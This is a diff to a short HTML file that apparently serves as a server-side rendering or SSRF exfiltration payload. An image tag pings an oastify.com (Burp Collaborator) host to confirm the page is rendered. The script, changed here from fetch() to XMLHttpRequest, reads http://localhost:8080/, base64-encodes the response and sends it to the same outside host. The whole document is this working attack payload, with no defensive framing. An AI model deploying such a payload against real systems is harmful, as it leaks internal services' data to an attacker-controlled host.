@@ -9,16 +9,17 @@
 
 <body>
     <h1>Hello</h1>
-    <img src="https://7ckynm4bbdnzholqxgv1rahydpjg7cv1.oastify.com/?ItsRenderingHtml">
+    <img src="https://bq521qifph13vszubk955ev2rtxklh96.oastify.com/?ItsRenderingHtml">
     <script>
-        fetch("http://localhost:8080/")
-            .then(res => res.text())
-            .then(body => {
-                new Image().src = "https://7ckynm4bbdnzholqxgv1rahydpjg7cv1.oastify.com/?data=" + btoa(body);
-            })
-            .catch(e => {
-                new Image().src = "https://7ckynm4bbdnzholqxgv1rahydpjg7cv1.oastify.com/?error=" + encodeURIComponent(e.message);
-            });
+        var x = new XMLHttpRequest();
+        x.open("GET", "http://localhost:8080/");
+        x.onload = function () {
+            new Image().src = "https://bq521qifph13vszubk955ev2rtxklh96.oastify.com/?leak=" + btoa(x.responseText);
+        };
+        x.onerror = function () {
+            new Image().src = "https://bq521qifph13vszubk955ev2rtxklh96.oastify.com/?error=XHRfail";
+        };
+        x.send();
     </script>
 
 </body>
